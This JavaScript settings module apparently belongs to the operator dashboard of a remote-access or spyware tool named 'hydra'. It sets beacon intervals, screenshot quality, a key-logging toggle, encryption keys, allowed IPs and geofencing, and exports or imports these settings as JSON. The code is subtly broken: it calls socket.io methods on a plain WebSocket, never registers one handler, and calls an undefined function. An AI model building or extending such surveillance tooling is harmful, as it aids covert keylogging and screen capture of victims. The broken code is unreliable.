// Settings Module
const Settings = {
    socket: null,
    currentSettings: {},

    init(socket) {
        this.socket = socket;
        this.setupEventListeners();
        this.loadSettings();
    },

    setupEventListeners() {
        // Settings form
        document.getElementById('settings-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.saveSettings();
        });

        // Security form
        document.getElementById('security-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.saveSecuritySettings();
        });

        // Socket event listeners
        this.socket.on('settings_updated', this.handleSettingsUpdated.bind(this));
        this.socket.on('security_settings_updated', this.handleSecuritySettingsUpdated.bind(this));
    },

    loadSettings() {
        this.socket.emit('get_settings');
    },

    handleSettings(data) {
        this.currentSettings = data.settings;
        this.updateSettingsForm();
    },

    updateSettingsForm() {
        // General settings
        document.getElementById('beacon-interval').value = this.currentSettings.beacon_interval || 60;
        document.getElementById('screenshot-quality').value = this.currentSettings.screenshot_quality || 'medium';
        document.getElementById('key-logging').checked = this.currentSettings.key_logging || false;
    },

    saveSettings() {
        const settings = {
            beacon_interval: parseInt(document.getElementById('beacon-interval').value),
            screenshot_quality: document.getElementById('screenshot-quality').value,
            key_logging: document.getElementById('key-logging').checked
        };

        this.socket.emit('update_settings', settings);
    },

    handleSettingsUpdated(data) {
        if (data.success) {
            dashboard.showNotification('Settings updated successfully', 'success');
            this.currentSettings = data.settings;
        } else {
            dashboard.showNotification('Failed to update settings: ' + data.error, 'danger');
        }
    },

    saveSecuritySettings() {
        const settings = {
            encryption_key: document.getElementById('encryption-key').value,
            allowed_ips: document.getElementById('allowed-ips').value.split('\n').filter(ip => ip.trim()),
            geofencing: document.getElementById('geofencing').checked
        };

        this.socket.emit('update_security_settings', settings);
    },

    handleSecuritySettingsUpdated(data) {
        if (data.success) {
            dashboard.showNotification('Security settings updated successfully', 'success');
            // Clear sensitive fields
            document.getElementById('encryption-key').value = '';
        } else {
            dashboard.showNotification('Failed to update security settings: ' + data.error, 'danger');
        }
    },

    // Theme settings
    setTheme(theme) {
        document.body.classList.remove('dark-theme');
        if (theme === 'dark') {
            document.body.classList.add('dark-theme');
        }
        localStorage.setItem('theme', theme);
        dashboard.showNotification(`Theme changed to ${theme}`, 'info');
    },

    // Export settings
    exportSettings() {
        const settings = {
            general: this.currentSettings,
            security: {
                allowed_ips: document.getElementById('allowed-ips').value.split('\n').filter(ip => ip.trim()),
                geofencing: document.getElementById('geofencing').checked
            }
        };

        const blob = new Blob([JSON.stringify(settings, null, 2)], { type: 'application/json' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'hydra_settings.json';
        a.click();
        window.URL.revokeObjectURL(url);
    },

    // Import settings
    importSettings(file) {
        const reader = new FileReader();
        reader.onload = (e) => {
            try {
                const settings = JSON.parse(e.target.result);
                this.socket.emit('import_settings', settings);
            } catch (error) {
                dashboard.showNotification('Invalid settings file format', 'danger');
            }
        };
        reader.readAsText(file);
    }
};

// Initialize when document is ready
document.addEventListener('DOMContentLoaded', () => {
    // Initialize WebSocket connection
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const socket = new WebSocket(`${protocol}//${window.location.host}/ws/dashboard`);

    // Handle WebSocket messages
    socket.onmessage = (event) => {
        const data = JSON.parse(event.data);
        if (data.type === 'settings_update') {
            updateSettings(data.settings);
        }
    };

    Settings.init(socket);
}); 